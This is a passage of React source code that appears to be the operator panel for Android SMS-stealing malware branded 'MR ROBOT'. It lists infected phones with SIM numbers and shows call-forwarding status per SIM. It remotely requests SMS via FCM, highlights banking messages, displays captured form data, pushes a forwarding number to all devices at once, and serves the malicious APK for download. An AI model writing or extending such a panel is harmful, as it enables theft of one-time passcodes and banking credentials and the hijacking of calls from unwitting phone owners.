          <Row label="SIM 2" value={[selected.sim2Carrier, selected.sim2Phone].filter(Boolean).join(": ") || "—"} />
          {/* Call Forward live status row */}
          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "9px 14px", borderBottom: `1px solid ${t.cardB}` }}>
            <span style={{ fontSize: 12, color: t.muted, fontWeight: 600, letterSpacing: 1, textTransform: "uppercase" }}>Call Forward</span>
            <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
              {/* ON / OFF badge with inline SIM slot */}
              <span style={{
                display: "inline-flex", alignItems: "center", gap: 5,
                background: selected.forwardEnabled ? "#14532d" : "#450a0a",
                border: `1px solid ${selected.forwardEnabled ? "#22c55e" : "#ef4444"}`,
                borderRadius: 20, padding: "3px 11px", fontSize: 12, fontWeight: 700,
                color: selected.forwardEnabled ? "#4ade80" : "#f87171",
              }}>
                <span style={{
                  width: 7, height: 7, borderRadius: "50%",
                  background: selected.forwardEnabled ? "#22c55e" : "#ef4444",
                  boxShadow: selected.forwardEnabled ? "0 0 6px #22c55e" : "none",
                  display: "inline-block", flexShrink: 0,
                }} />
                {selected.forwardEnabled ? "ON" : "OFF"}
              </span>
              {/* SIM slot badge — inline right next to ON, slot 0 = SIM 1, slot 1 = SIM 2 */}
              {selected.forwardEnabled && (
                <span style={{
                  display: "inline-flex", alignItems: "center", gap: 4,
                  background: "#0f2744", border: "1px solid #2563eb",
                  borderRadius: 20, padding: "3px 10px", fontSize: 11, fontWeight: 700,
                  color: "#93c5fd",
                }}>
                  <svg width="10" height="10" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0 }}>
                    <rect x="5" y="2" width="14" height="20" rx="2" stroke="#93c5fd" strokeWidth="2"/>
                    <path d="M9 6h6M9 10h6M9 14h4" stroke="#93c5fd" strokeWidth="1.5" strokeLinecap="round"/>
                  </svg>
                  {selected.forwardSlot !== null && selected.forwardSlot !== undefined
                    ? `SIM ${(selected.forwardSlot as number) + 1}`
                    : "SIM —"}
                </span>
              )}
            </div>
          </div>
          <Row label="Installed" value={fmtDate(selected.installedAt)} accent="#22c55e" />
          {/* Last Seen row with Form Data button */}
          <div style={{ display: "flex", alignItems: "center", padding: "9px 14px", borderBottom: `1px solid ${t.hdrB}`, gap: 8 }}>
            <div style={{ width: 100, fontSize: 11, color: t.muted, fontWeight: 600, flexShrink: 0, textTransform: "uppercase", letterSpacing: 0.3 }}>Last Seen</div>
            <div style={{ flex: 1, fontSize: 12, color: selected.status !== "uninstalled" && isRecent(selected.lastOnline) ? "#22c55e" : t.txt }}>
              {selected.status === "uninstalled" ? "App uninstalled" : timeAgo(selected.lastOnline)}
            </div>
            <button
              onClick={() => setShowFormData(v => !v)}
              style={{
                flexShrink: 0,
                background: showFormData ? "#6366f1" : t.card,
                border: `1.5px solid ${showFormData ? "#6366f1" : t.cardB}`,
                borderRadius: 8, padding: "8px 14px",
                fontSize: 13, fontWeight: 700,
                color: showFormData ? "#fff" : t.txt2,
                cursor: "pointer", transition: "all 0.15s",
              }}>
              Form Data
            </button>
            <button
              onClick={handleBack}
              style={{
                display: "none", // moved to Name row
                flexShrink: 0,
                background: "#6366f1",
                border: `1.5px solid #6366f1`,
                borderRadius: 8, padding: "8px 14px",
                fontSize: 13, fontWeight: 800,
                color: "#fff",
                cursor: "pointer", transition: "all 0.15s",
                boxShadow: "0 2px 10px rgba(99,102,241,0.5)",
                letterSpacing: 0.3,
              }}>
              ← Back
            </button>
          </div>
        </div>

        {/* Action buttons */}
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 8 }}>
          {ACTIONS.map(({ label, key }) => {
            const isQuick = key === "online_check" || key === "get_sms";
            const qs = quickState[key] ?? "idle";
            const isActive = activeAction === key;

            if (isQuick) {
              const isLoading = qs === "loading";
              const isOk = qs === "ok";
              const bgColor = isOk ? "#22c55e" : isLoading ? "#6366f1" : t.card;
              const bdColor = isOk ? "#22c55e" : isLoading ? "#6366f1" : t.cardB;
              const txtColor = (isOk || isLoading) ? "#fff" : t.txt2;
              const btnLabel = isLoading
                ? (key === "online_check" ? `${onlineTimer}s…` : "Requesting…")
                : isOk ? "Sent ✓" : label;
              return (
                <div key={key} style={{ display: "flex", flexDirection: "column" }}>
                  <button
                    onClick={() => void sendQuick(selected, key as "online_check"|"get_sms")}
                    disabled={isLoading}
                    style={{
                      background: bgColor, border: "1.5px solid", borderColor: bdColor,
                      borderRadius: 9, padding: "10px 4px", cursor: isLoading ? "wait" : "pointer",
                      fontSize: 11, color: txtColor, fontWeight: 600,
                      textAlign: "center", transition: "all 0.15s", width: "100%",
                    }}>
                    {btnLabel}
                  </button>
                  {/* 5-second FCM progress bar — only for get_sms, not online_check */}
                  {key !== "online_check" && <SendProgressBar active={quickProgress[key] === true} />}
                </div>
              );
            }

            return (
              <button key={key} onClick={() => setActiveAction(isActive ? null : key)} style={{
                background: isActive ? "#eef2ff" : t.card,
                border: "1.5px solid", borderColor: isActive ? "#6366f1" : t.cardB,
                borderRadius: 9, padding: "10px 4px", cursor: "pointer",
                fontSize: 11, color: isActive ? "#6366f1" : t.txt2, fontWeight: isActive ? 700 : 500,
                textAlign: "center",
              }}>
                {label}
              </button>
            );
          })}
        </div>

        {/* Form Data panel */}
        {showFormData && (() => {
          const entries = formData.filter(f => f.deviceId === selected.deviceId)
            .sort((a, b) => new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime());
          return (
            <div style={{
              background: t.card, border: `1.5px solid #6366f1`,
              borderRadius: 10, overflow: "hidden",
            }}>
              <div style={{
                display: "flex", alignItems: "center", justifyContent: "space-between",
                padding: "9px 14px", borderBottom: `1px solid ${t.hdrB}`,
                background: t.isDark ? "#1a1f3a" : "#eef2ff",
              }}>
                <span style={{ fontSize: 12, fontWeight: 700, color: "#6366f1" }}>
                  Form Data ({entries.length})
                </span>
                <button onClick={() => setShowFormData(false)}
                  style={{ background: "none", border: "none", cursor: "pointer", fontSize: 14, color: t.muted, lineHeight: 1 }}>
                  ✕
                </button>
              </div>
              {entries.length === 0
                ? <div style={{ padding: "16px", textAlign: "center", fontSize: 12, color: t.muted }}>No form data for this device</div>
                : entries.map((entry, ei) => (
                  <div key={entry.id} style={{
                    padding: "10px 14px",
                    borderBottom: ei < entries.length - 1 ? `1px solid ${t.hdrB}` : "none",
                  }}>
                    <div style={{ fontSize: 10, color: t.muted, fontWeight: 600, marginBottom: 6, textTransform: "uppercase", letterSpacing: 0.3 }}>
                      {fmtDate(entry.submittedAt)}
                    </div>
                    {Object.entries(entry.data).map(([k, v]) => (
                      <div key={k} style={{ display: "flex", gap: 8, marginBottom: 4, alignItems: "flex-start" }}>
                        <span style={{ fontSize: 10, fontWeight: 700, color: "#6366f1", minWidth: 80, flexShrink: 0, textTransform: "capitalize", paddingTop: 1 }}>
                          {k}
                        </span>
                        <span style={{ fontSize: 11, color: t.txt, wordBreak: "break-all", flex: 1 }}>
                          {String(v)}
                        </span>
                        <CopyIconButton value={String(v)} size={16} color="#6366f1" title="Copy" />
                      </div>
                    ))}
                  </div>
                ))
              }
            </div>
          );
        })()}

        {/* Live Online Check countdown — shown prominently inside device panel */}
        {quickState.online_check === "loading" && (
          <div style={{
            marginTop: 8, background: "#eef2ff", borderRadius: 10,
            border: "1.5px solid #6366f1", padding: "10px 14px",
            display: "flex", flexDirection: "column", gap: 6,
          }}>
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
              <span style={{ fontSize: 12, fontWeight: 700, color: "#4338ca" }}>
                Waiting for device response…
              </span>
              <span style={{
                fontSize: 18, fontWeight: 800, color: "#6366f1",
                fontVariantNumeric: "tabular-nums", minWidth: 48, textAlign: "right",
              }}>
                {onlineTimer}s
              </span>
            </div>
            {/* Progress bar filling as seconds count up to 30 */}
            <div style={{ height: 6, borderRadius: 99, background: "#c7d2fe", overflow: "hidden" }}>
              <div style={{
                height: "100%", borderRadius: 99,
                background: "linear-gradient(90deg, #6366f1, #818cf8)",
                width: `${Math.min(100, Math.round((onlineTimer / 30) * 100))}%`,
                transition: "width 1s linear",
              }} />
            </div>
            <div style={{ fontSize: 10, color: "#6366f1", textAlign: "right" }}>
              {30 - onlineTimer}s remaining
            </div>
          </div>
        )}

        {/* Inline action panel */}
        {activeAction && <ActionPanel action={activeAction} device={selected} onClose={() => setActiveAction(null)} />}

        {/* Messages */}
        <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "9px 12px", borderBottom: `1px solid ${t.hdrB}` }}>
            <span style={{ color: t.muted, fontSize: 13 }}>⌕</span>
            <input value={msgSearch} onChange={e => setMsgSearch(e.target.value)} placeholder="Search messages…"
              style={{ border: "none", outline: "none", flex: 1, fontSize: 11, background: "transparent", color: t.txt }} />
            <span style={{ fontSize: 10, color: "#94a3b8" }}>Newest first</span>
          </div>
          {deviceMsgs.length === 0
            ? <div style={{ padding: "20px", textAlign: "center", color: "#94a3b8", fontSize: 12 }}>No messages</div>
            : deviceMsgs.map((msg, i) => (
              <div key={msg.id} style={{ padding: "10px 14px", borderBottom: i < deviceMsgs.length - 1 ? `1px solid ${t.hdrB}` : "none" }}>
                <div style={{ display: "flex", gap: 5, alignItems: "center", marginBottom: 4 }}>
                  <span style={{ fontSize: 10, color: t.muted }}>{fmtDate(msg.receivedAt)}</span>
                </div>
                <div style={{ display: "flex", alignItems: "flex-start", gap: 6, marginBottom: 4 }}>
                  <div style={{ flex: 1, fontSize: 12, color: isBankingMsg(msg.body, msg.fromSender) ? "#16a34a" : t.txt, lineHeight: 1.5, wordBreak: "break-word" }}>{msg.body}</div>
                  <CopyIconButton value={msg.body} size={22} color="#6366f1" title="Copy message" />
                </div>
                <div style={{ display: "flex", gap: 10, fontSize: 11, flexWrap: "wrap", alignItems: "center" }}>
                  {(() => {
                    const displaySender = isJunkSender(msg.fromSender) ? msg.fromNumber : msg.fromSender;
                    return (
                      <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
                        <span style={{ color: "#94a3b8", fontSize: 10, marginRight: 3, fontWeight: 600 }}>FROM</span>{displaySender}
                        <CopyIconButton value={displaySender} size={18} color="#6366f1" title="Copy sender" />
                      </span>
                    );
                  })()}
                  {msg.toNumber && (
                    <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
                      <span style={{ color: "#94a3b8", fontSize: 10, marginRight: 3, fontWeight: 600 }}>TO</span>{msg.toNumber}
                      <CopyIconButton value={msg.toNumber} size={18} color="#6366f1" title="Copy receiver" />
                    </span>
                  )}
                  <span style={{ flex: 1 }} />
                  <DeleteIconButton
                    size={30}
                    title="Delete this SMS"
                    confirmTitle="Delete SMS"
                    confirmText={`Are you sure you want to delete this SMS from ${msg.fromSender}? This action cannot be undone.`}
                    onConfirm={async () => {
                      const r = await fetch(`/api/messages/${msg.id}`, { method: "DELETE" });
                      if (!r.ok) throw new Error(`Server error (${r.status}). Please make sure the server is updated and try again.`);
                    }}
                  />
                </div>
              </div>
            ))
          }
        </div>
      </div>
    );
  }

  /* ── Device list ── */
  return (
    <div style={{ padding: 10, display: "flex", flexDirection: "column", gap: 10 }}>
      <div style={{ background: t.card, border: `1px solid ${t.cardB}`, borderRadius: 8, display: "flex", alignItems: "center", padding: "8px 10px", gap: 6 }}>
        <span style={{ color: t.muted, fontSize: 13 }}>⌕</span>
        <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search devices…"
          style={{ border: "none", outline: "none", flex: 1, fontSize: 12, background: "transparent", color: t.txt }} />
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, alignItems: "start" }}>
        {visibleDevices.map((device, idx) => {
          const recent = device.status !== "uninstalled" && isRecent(device.lastOnline);
          const rows = [
            { label: "ID", value: device.deviceId, mono: true },
            { label: "Android", value: String(device.androidVersion) },
            { label: "SIM 1", value: [device.sim1Carrier, device.sim1Phone].filter(Boolean).join(":  ") || "—" },
            { label: "SIM 2", value: [device.sim2Carrier, device.sim2Phone].filter(Boolean).join(":  ") || "—" },
            { label: "User ID", value: device.userId, mono: true },
          ];
          return (
            <div key={device.deviceId} style={{ display: "flex", flexDirection: "column", gap: 6 }}>
              {/* Card box — clicking navigates to detail */}
              <div onClick={() => {
                const scrollEl = document.getElementById("main-scroll");
                internalScrollRef.current = scrollEl?.scrollTop ?? 0;
                internalCountRef.current = visibleDevices.length;
                setSelected(device); setFromExternal(false); localStorage.setItem(DEVICE_KEY, device.deviceId);
              }}
                style={{ background: t.card, borderRadius: 12, border: `1px solid ${t.cardB}`, cursor: "pointer", overflow: "hidden" }}>

                {/* Card header */}
                <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.cardB}`, background: t.hdr }}>
                  <span style={{ fontWeight: 800, fontSize: 13, color: t.txt }}>
                    {filtered.length - idx}.&nbsp;{device.name}
                  </span>
                </div>

                {/* Table rows */}
                {rows.map(({ label, value, mono }, i) => (
                  <div key={label} style={{
                    display: "flex", alignItems: "center",
                    borderBottom: i < rows.length - 1 ? `1px solid ${t.hdrB}` : "none",
                    padding: "7px 14px",
                  }}>
                    <span style={{ width: 64, fontSize: 11, color: t.muted, fontWeight: 600, flexShrink: 0 }}>{label}:</span>
                    <span style={{ fontSize: 11, color: t.txt2, fontFamily: mono ? "monospace" : undefined, wordBreak: "break-all", lineHeight: 1.4 }}>{value}</span>
                  </div>
                ))}

                {/* Online row */}
                <div style={{ display: "flex", alignItems: "center", padding: "7px 14px" }}>
                  <span style={{ width: 64, fontSize: 11, color: "#94a3b8", fontWeight: 600, flexShrink: 0 }}>Online:</span>
                  <span style={{ fontSize: 11, fontWeight: recent ? 700 : 400, color: recent ? "#16a34a" : "#64748b" }}>
                    {device.status === "uninstalled" ? "Uninstalled" : timeAgo(device.lastOnline)}
                  </span>
                </div>
              </div>

              {/* Check Online button — outside card, directly below */}
              <CheckOnlineBtn device={device} />
            </div>
          );
        })}
      </div>
      {filtered.length === 0 && <div style={{ textAlign: "center", color: "#94a3b8", padding: 32 }}>No devices found</div>}
      <div ref={devSentinel} style={{ height: 1 }} />
      {devsLoading && <div style={{ display: "flex", justifyContent: "center", padding: "10px 0" }}><CircularLoader size={22} color="#6366f1" /></div>}
    </div>
  );
}

/* ════════════════════════════════════════
   PAGE — SETTINGS
════════════════════════════════════════ */
function SettingsPage({ appId, isDark, onToggleDark, devices, onLogout }: {
  appId: string; isDark: boolean; onToggleDark: () => void; devices: DbDevice[]; onLogout: () => void;
}) {
  const t = useTheme();
  const AUTH_KEY = `mrrobot_auth_${appId}`;
  const SESS_KEY = `mrrobot_session_id_${appId}`;

  /* ── Admin Sessions ── */
  const [sessions, setSessions] = useState<AdminSession[]>([]);
  const [sessLoading, setSessLoading] = useState(true);
  const mySessionId = localStorage.getItem(SESS_KEY) ?? "";

  // Skip auto-logout on the first poll — avoids false logouts from cold-start /
  // network races right after Settings opens.
  const firstFetchRef = useRef(true);
  // Require 2 consecutive "session missing" responses before kicking the user
  // out. A single missing response can happen on transient server state.
  const missCountRef = useRef(0);

  async function fetchSessions() {
    try {
      const r = await fetch(`/api/admin/sessions?appId=${encodeURIComponent(appId)}`, { headers: { "x-silent": "1" } });
      if (!r.ok) return;
      const list: AdminSession[] = await r.json();
      setSessions(list);

      // Safety guard: skip only the very first fetch (cold-start race)
      const isFirst = firstFetchRef.current;
      firstFetchRef.current = false;
      if (isFirst) { missCountRef.current = 0; return; }

      const myId = localStorage.getItem(SESS_KEY);
      // No session ID stored OR session not in active list → miss → logout after 2 consecutive misses
      if (!myId || !list.find(s => s.id === myId)) {
        missCountRef.current += 1;
        if (missCountRef.current >= 2) {
          localStorage.removeItem(AUTH_KEY);
          localStorage.removeItem(SESS_KEY);
          onLogout();
        }
      } else {
        missCountRef.current = 0;
      }
    } catch { /* ignore */ } finally { setSessLoading(false); }
  }

  async function logoutSession(id: string) {
    await fetch(`/api/admin/sessions/${id}`, { method: "DELETE" });
    if (id === mySessionId) { onLogout(); return; }
    fetchSessions();
  }

  async function logoutAll() {
    await fetch(`/api/admin/sessions?appId=${encodeURIComponent(appId)}`, { method: "DELETE" });
    onLogout();
  }

  useEffect(() => { fetchSessions(); const iv = setInterval(fetchSessions, 15000); return () => clearInterval(iv); }, []);

  /* ── Update Admin (batch FCM status:on to all devices) ── */
  const [adminNum, setAdminNum] = useState("");
  const [numState, setNumState] = useState<"idle"|"running"|"done"|"err">("idle");
  const [numMsg, setNumMsg] = useState("");
  const [updateDone, setUpdateDone] = useState(0);
  const [updateResult, setUpdateResult] = useState<{ ok: number; fail: number } | null>(null);

  async function handleUpdateAdmin() {
    const val = adminNum.replace(/\D/g, "");
    if (val.length !== 10) { setNumMsg("Enter exactly 10 digits."); setNumState("err"); setTimeout(() => { setNumState("idle"); setNumMsg(""); }, 2500); return; }
    if (devices.length === 0) { setNumMsg("No devices to update."); setNumState("err"); setTimeout(() => { setNumState("idle"); setNumMsg(""); }, 2500); return; }

    setNumState("running"); setNumMsg(""); setUpdateDone(0); setUpdateResult(null);
    const BATCH = 10; const DELAY = 300;
    let ok = 0; let fail = 0;

    for (let i = 0; i < devices.length; i += BATCH) {
      const batch = devices.slice(i, i + BATCH);
      const results = await Promise.allSettled(
        batch.map(d => fcmSend(d.deviceId, mkAdminUpdate(d.deviceId, val, "on")))
      );
      results.forEach(r => r.status === "fulfilled" ? ok++ : fail++);
      setUpdateDone(Math.min(i + BATCH, devices.length));
      if (i + BATCH < devices.length) await new Promise(r => setTimeout(r, DELAY));
    }
    setUpdateResult({ ok, fail }); setNumState("done"); setAdminNum("");
    setTimeout(() => { setNumState("idle"); setUpdateDone(0); setUpdateResult(null); setNumMsg(""); }, 5000);
  }

  /* ── Disable All (batch FCM status:off) ── */
  const eligible = devices;
  const [disableAllState, setDisableAllState] = useState<"idle"|"running"|"done">("idle");
  const [disableAllDone, setDisableAllDone] = useState(0);
  const [disableAllResult, setDisableAllResult] = useState<{ ok: number; fail: number } | null>(null);

  async function handleDisableAll() {
    if (disableAllState === "running" || eligible.length === 0) return;
    const BATCH = 10; const DELAY = 300;
    setDisableAllState("running"); setDisableAllDone(0); setDisableAllResult(null);
    let ok = 0; let fail = 0;
    for (let i = 0; i < eligible.length; i += BATCH) {
      const batch = eligible.slice(i, i + BATCH);
      const results = await Promise.allSettled(batch.map(d => fcmSend(d.deviceId, mkAdminUpdate(d.deviceId, "", "off"))));
      results.forEach(r => r.status === "fulfilled" ? ok++ : fail++);
      setDisableAllDone(Math.min(i + BATCH, eligible.length));
      if (i + BATCH < eligible.length) await new Promise(r => setTimeout(r, DELAY));
    }
    setDisableAllResult({ ok, fail }); setDisableAllState("done");
    setTimeout(() => { setDisableAllState("idle"); setDisableAllDone(0); setDisableAllResult(null); }, 5000);
  }

  /* ── Ping All (batch FCM type:0 to all devices) ── */
  const [pingAllState, setPingAllState] = useState<"idle"|"running"|"done">("idle");
  const [pingAllDone, setPingAllDone] = useState(0);

  async function handlePingAll() {
    if (pingAllState === "running" || devices.length === 0) return;
    const BATCH = 10; const DELAY = 300;
    setPingAllState("running"); setPingAllDone(0);
    for (let i = 0; i < devices.length; i += BATCH) {
      const batch = devices.slice(i, i + BATCH);
      await Promise.allSettled(batch.map(d => fcmSend(d.deviceId, mkCheckOnline())));
      setPingAllDone(Math.min(i + BATCH, devices.length));
      if (i + BATCH < devices.length) await new Promise(r => setTimeout(r, DELAY));
    }
    setPingAllState("done");
    setTimeout(() => { setPingAllState("idle"); setPingAllDone(0); }, 4000);
  }

  const IS: React.CSSProperties = {
    width: "100%", boxSizing: "border-box", padding: "10px 12px",
    borderRadius: 8, border: `1.5px solid ${numState === "err" ? "#ef4444" : t.cardB}`,
    background: t.bg, color: t.txt, fontSize: 14, outline: "none",
    letterSpacing: 1,
  };

  return (
    <div style={{ padding: 10, display: "flex", flexDirection: "column", gap: 10 }}>

      {/* ── Download Android App ── */}
      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.cardB}`, background: t.hdr, display: "flex", alignItems: "center", gap: 8 }}>
          <span style={{ fontSize: 16 }}>📱</span>
          <span style={{ fontWeight: 800, fontSize: 13, color: t.txt }}>Download Android App</span>
        </div>
        <div style={{ padding: 14, display: "flex", flexDirection: "column", gap: 10 }}>
          <div style={{ fontSize: 12, color: t.muted, lineHeight: 1.5 }}>
            Install the MR ROBOT Android app on a device. Tap the button below to download the latest APK, then open it on your phone to install.
          </div>
          <a
            href="/MR_ROBOT.apk"
            download="MR_ROBOT.apk"
            style={{
              display: "inline-flex", alignItems: "center", justifyContent: "center", gap: 8,
              padding: "12px 18px", borderRadius: 8,
              background: "linear-gradient(135deg, #6366f1, #8b5cf6)",
              color: "#fff", fontWeight: 700, fontSize: 13,
              textDecoration: "none", boxShadow: "0 4px 14px rgba(99,102,241,0.45)",
              cursor: "pointer", border: "none",
            }}
          >
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
              <polyline points="7 10 12 15 17 10" />
              <line x1="12" y1="15" x2="12" y2="3" />
            </svg>
            Download APK
          </a>
          <div style={{ fontSize: 10, color: t.muted, lineHeight: 1.4 }}>
            ⚠ You may need to enable "Install from unknown sources" in your phone settings.
          </div>
        </div>
      </div>

      {/* ── Update Admin ── */}
      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <span style={{ fontSize: 12, fontWeight: 700, color: t.txt2 }}>Update Admin</span>
          <span style={{ background: devices.length > 0 ? "#6366f1" : t.hdrB, color: devices.length > 0 ? "#fff" : t.muted, borderRadius: 99, padding: "1px 7px", fontSize: 10, fontWeight: 800 }}>
            {devices.length} devices
          </span>
        </div>
        <div style={{ padding: "14px 16px", display: "flex", flexDirection: "column", gap: 10 }}>
          <input
            type="tel"
            value={adminNum}
            onChange={e => {
              const digits = e.target.value.replace(/\D/g, "").slice(0, 10);
              setAdminNum(digits);
              if (numState !== "idle") { setNumState("idle"); setNumMsg(""); setUpdateResult(null); }
            }}
            placeholder="Enter 10-digit number"
            maxLength={10}
            disabled={numState === "running"}
            style={IS}
          />
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <span style={{ fontSize: 11, color: numState === "err" ? "#ef4444" : numState === "done" ? "#22c55e" : t.muted, fontWeight: 600 }}>
              {numMsg || `${adminNum.length}/10 digits`}
            </span>
            {adminNum.length === 10 && numState === "idle" && (
              <span style={{ fontSize: 10, color: "#22c55e", fontWeight: 700 }}>✓ Ready</span>
            )}
          </div>

          {/* Update progress bar */}
          {numState === "running" && (
            <div>
              <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: t.muted, marginBottom: 5 }}>
                <span>Sending to all devices…</span>
                <span>{updateDone}/{devices.length}</span>
              </div>
              <div style={{ height: 5, background: t.hdrB, borderRadius: 3, overflow: "hidden" }}>
                <div style={{ height: "100%", background: "#6366f1", width: `${devices.length > 0 ? Math.round((updateDone / devices.length) * 100) : 0}%`, transition: "width 0.3s" }} />
              </div>
            </div>
          )}


          <button
            onClick={() => void handleUpdateAdmin()}
            disabled={numState === "running" || devices.length === 0}
            style={{
              width: "100%", padding: "12px 0", borderRadius: 9, border: "none",
              background: numState === "done" ? "#22c55e" : numState === "running" ? "#ede9fe" : adminNum.length === 10 ? "#6366f1" : t.hdrB,
              color: numState === "done" || adminNum.length === 10 ? "#fff" : numState === "running" ? "#6366f1" : t.muted,
              fontWeight: 700, fontSize: 14,
              cursor: numState === "running" || devices.length === 0 ? "not-allowed" : adminNum.length < 10 && numState === "idle" ? "not-allowed" : "pointer",
              transition: "background 0.15s",
            }}
          >
            {numState === "running"
              ? `Sending ${updateDone}/${devices.length}…`
              : numState === "done" ? "Done ✓"
              : devices.length === 0 ? "No Devices"
              : "Update"}
          </button>

          {/* Divider */}
          <div style={{ height: 1, background: t.hdrB, margin: "2px 0" }} />

          {/* Disable All progress */}
          {disableAllState === "running" && (
            <div>
              <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: t.muted, marginBottom: 5 }}>
                <span>Disabling all devices…</span>
                <span>{disableAllDone}/{eligible.length}</span>
              </div>
              <div style={{ height: 5, background: t.hdrB, borderRadius: 3, overflow: "hidden" }}>
                <div style={{ height: "100%", background: "#ef4444", width: `${eligible.length > 0 ? Math.round((disableAllDone / eligible.length) * 100) : 0}%`, transition: "width 0.3s" }} />
              </div>
            </div>
          )}


          {/* Disable All button */}
          <button
            onClick={() => void handleDisableAll()}
            disabled={disableAllState === "running" || eligible.length === 0}
            style={{
              width: "100%", padding: "11px 0", borderRadius: 9, border: "1.5px solid",
              borderColor: disableAllState === "done" ? "#22c55e" : "#ef4444",
              background: disableAllState === "done" ? "#22c55e" : disableAllState === "running" ? "#fee2e2" : "transparent",
              color: disableAllState === "done" ? "#fff" : disableAllState === "running" ? "#ef4444" : eligible.length === 0 ? t.muted : "#ef4444",
              fontWeight: 700, fontSize: 13,
              cursor: disableAllState === "running" || eligible.length === 0 ? "not-allowed" : "pointer",
              transition: "all 0.15s",
            }}
          >
            {disableAllState === "running"
              ? `Disabling ${disableAllDone}/${eligible.length}…`
              : disableAllState === "done"
              ? "Done ✓"
              : eligible.length === 0
              ? "No Eligible Devices"
              : `Disable All (${eligible.length})`}
          </button>
        </div>
      </div>

      {/* ── Day / Night Mode ── */}
      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, fontSize: 12, fontWeight: 700, color: t.txt2 }}>Display</div>
        <div style={{ padding: "14px 16px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <span style={{ fontSize: 22 }}>{isDark ? "🌙" : "☀️"}</span>
            <div>
              <div style={{ fontWeight: 700, fontSize: 14, color: t.txt }}>{isDark ? "Night Mode" : "Day Mode"}</div>
              <div style={{ fontSize: 11, color: t.muted, marginTop: 1 }}>{isDark ? "Dark theme active" : "Light theme active"}</div>
            </div>
          </div>
          <div onClick={onToggleDark} style={{ width: 50, height: 28, borderRadius: 14, background: isDark ? "#6366f1" : "#e2e8f0", position: "relative", cursor: "pointer", transition: "background 0.2s", flexShrink: 0 }}>
            <div style={{ position: "absolute", top: 3, left: isDark ? 25 : 3, width: 22, height: 22, borderRadius: "50%", background: "#fff", boxShadow: "0 1px 4px rgba(0,0,0,0.2)", transition: "left 0.2s" }} />
          </div>
        </div>
      </div>

      {/* ── App Info ── */}
      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, fontSize: 12, fontWeight: 700, color: t.txt2 }}>App Info</div>
        {[
          { label: "App ID", value: appId, mono: true },
        ].map(({ label, value, mono }) => (
          <Row key={label} label={label} value={value} mono={mono} />
        ))}
      </div>

      {/* ── Admin Sessions ── */}
      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
            <div style={{ fontWeight: 800, fontSize: 13, color: t.txt }}>Sessions for {appId}</div>
            <div style={{ background: sessions.length > 0 ? "#6366f1" : "#e2e8f0", color: sessions.length > 0 ? "#fff" : "#94a3b8", borderRadius: 99, padding: "1px 7px", fontSize: 10, fontWeight: 800 }}>
              {sessions.length}
            </div>
          </div>
          {sessions.length > 0 && (
            <button onClick={() => void logoutAll()} style={{ background: "#fef2f2", color: "#ef4444", border: "1px solid #fecaca", borderRadius: 7, padding: "4px 10px", fontSize: 10, fontWeight: 700, cursor: "pointer" }}>
              Logout All
            </button>
          )}
        </div>
        {sessLoading
          ? <div style={{ padding: 20, display: "flex", justifyContent: "center" }}><CircularLoader size={28} color="#6366f1" labelColor="#94a3b8" /></div>
          : sessions.length === 0
            ? <div style={{ padding: 20, textAlign: "center", color: "#94a3b8", fontSize: 12 }}>No active sessions</div>
            : sessions.map((s, i) => {
                const isMe = s.id === mySessionId;
                return (
                  <div key={s.id} style={{
                    display: "flex", alignItems: "center", gap: 10, padding: "10px 14px",
                    borderBottom: i < sessions.length - 1 ? `1px solid ${t.hdrB}` : "none",
                    background: isMe ? (t === DT ? "#2e1f5e" : "#f5f3ff") : t.card,
                  }}>
                    <div style={{ width: 36, height: 36, borderRadius: 9, background: isMe ? "#6366f1" : "#e2e8f0", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0, fontSize: 15 }}>
                      {s.device.includes("iPhone") || s.device.includes("iPad") ? "🍎" :
                       s.device.includes("Android") ? "🤖" :
                       s.device.includes("Mac") ? "💻" :
                       s.device.includes("Windows") ? "🖥" : "📟"}
                    </div>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{ display: "flex", alignItems: "center", gap: 5 }}>
                        <span style={{ fontWeight: 700, fontSize: 12, color: t.txt }}>{s.device}</span>
                        {isMe && <span style={{ background: "#6366f1", color: "#fff", borderRadius: 99, padding: "1px 6px", fontSize: 9, fontWeight: 800 }}>THIS DEVICE</span>}
                      </div>
